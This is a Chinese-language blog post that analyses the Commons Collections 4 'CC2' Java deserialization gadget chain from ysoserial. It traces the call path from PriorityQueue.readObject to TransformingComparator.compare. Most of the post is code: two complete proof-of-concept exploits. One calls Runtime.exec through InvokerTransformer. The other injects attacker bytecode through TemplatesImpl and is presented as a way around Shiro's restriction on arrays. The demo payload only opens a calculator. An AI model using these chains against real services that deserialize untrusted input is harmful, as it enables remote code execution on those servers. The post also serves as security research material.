# [Java安全] CommonsCollections4链分析




# 前言

Apache Commons Collections有以下两 个分⽀版本：

- commons-collections:commons-collections
- org.apache.commons:commons-collections4

前者是Commons Collections⽼的版本包，当时版本号是3.2.1；后者是官⽅在2013年推出的4版本，当时版本号是4.0

那么他们有啥区别呢，因为我们是在研究CC反序列化链，所以我就从序列化链的角度来看

区别就是`LazyMap.decorate` 这个⽅法没了，但其实CC4也是有的，叫做`LazyMap.lazyMap`，我们把原来CC3的POC换成这个也是可以成功反序列化的

# CC2

ysoserial对commons-collections4准备了两个链，一个是CC2一个是CC4

在commons-collections中找Gadget的过程，实际上可以简化为，找⼀条从`Serializable#readObject()` ⽅法到 `Transformer#transform()` ⽅法的调⽤链

我们看ysoserial的CC2的gadget，可以发现这里用到了一个`PriorityQueue`和`TransformingComparator`

```java
/*
   Gadget chain:
      ObjectInputStream.readObject()
         PriorityQueue.readObject()
            ...
               TransformingComparator.compare()
                  InvokerTransformer.transform()
                     Method.invoke()
                        Runtime.exec()
 */
```

我们跟进具体分析一下利用链，首先我们看`TransformingComparator`，他有个compare方法，会调用transform

```java
public int compare(I obj1, I obj2) {
    O value1 = this.transformer.transform(obj1);
    O value2 = this.transformer.transform(obj2);
    return this.decorated.compare(value1, value2);
}
```

然后是PriorityQueue#readObject，他重写了readObject

```java
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in size, and any hidden stuff
        s.defaultReadObject();

        // Read in (and discard) array length
        s.readInt();

        SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
        queue = new Object[size];

        // Read in all elements.
        for (int i = 0; i < size; i++)
            queue[i] = s.readObject();

        // Elements are guaranteed to be in "proper order", but the
        // spec has never explained what that might be.
        heapify();
    }
```

执行了一个`heapify()`，跟进去，调用了`siftDown`

```
    private void heapify() {
        for (int i = (size >>> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);
    }
```

跟进`siftDown`，调用了`siftDownUsingComparator`，这里面调用了compare，这就和前面说的`TransformingComparator`连接上了

```java
    private void siftDownUsingComparator(int k, E x) {
        int half = size >>> 1;
        while (k < half) {
            int child = (k << 1) + 1;
            Object c = queue[child];
            int right = child + 1;
            if (right < size &&
                comparator.compare((E) c, (E) queue[right]) > 0)
                c = queue[child = right];
            if (comparator.compare(x, (E) c) <= 0)
                break;
            queue[k] = c;
            k = child;
        }
        queue[k] = x;
    }
```

POC编写

首先还是那套

```java
        Transformer[] faketransformer = new Transformer[]{new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) })};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new String[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
                new ConstantTransformer(1) };

        // 传入fake防止序列化时执行
        Transformer transformerChain = new ChainedTransformer(faketransformer);
```

然后再创建一个comparator，把transformerChain传进去

```java
Comparator comparator = new TransformingComparator(transformerChain);
```

实例化PriorityQueue，因为要执行compare，所以得传入2个单位，第二个参数写刚刚的comparator去执行到comparator.compare进而触发TransformingComparator的transform方法

```
PriorityQueue queue = new PriorityQueue(2, comparator);
queue.add(1);
queue.add(2);
```

往transformerChain替换进恶意的transformers

```java
setFieldValue(transformerChain, "iTransformers", transformers);
```

最后的POC

```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

import static com.sun.xml.internal.xsom.impl.UName.comparator;

public class CC2 {
    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        Transformer[] faketransformer = new Transformer[]{new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) })};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new String[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
                new ConstantTransformer(1) };

        // 传入fake防止序列化时执行
        Transformer transformerChain = new ChainedTransformer(faketransformer);
        Comparator comparator = new TransformingComparator(transformerChain);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);
        setFieldValue(transformerChain, "iTransformers", transformers);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

# CC2与TemplatesImpl

前面说了Shiro这里不能有数组，所以这里我们再试试用TemplatesImpl来构造POC

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CC2pro {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazzz = pool.get("EvilTest");
        byte[] code = clazzz.toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        // 无害transformer防止构造时触发
        Transformer transformer = new InvokerTransformer("toString", null, null);
        Comparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(2,comparator);
        queue.add(obj);
        queue.add(obj);
        setFieldValue(transformer, "iMethodName", "newTransformer");

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}

```

有点区别的是这里，我们的`queue.add(obj)`，为什么不能add(1)了

因为我们用了TemplatesImpl取代了ChainedTransformer，所以得找个办法传入参数，而这里的add就是一个传入参数的点，可以调试到，最后执行transform的时候，里面传的参数就是我们add进去的值

![image-20221006010025355](https://tuchuang.huamang.xyz/img/image-20221006010025355.png)

所以我们传入TemplatesImpl对象，就会变成这样，成功进入TemplatesImpl的newTransformer

![image-20221006011922367](https://tuchuang.huamang.xyz/img/image-20221006011922367.png)

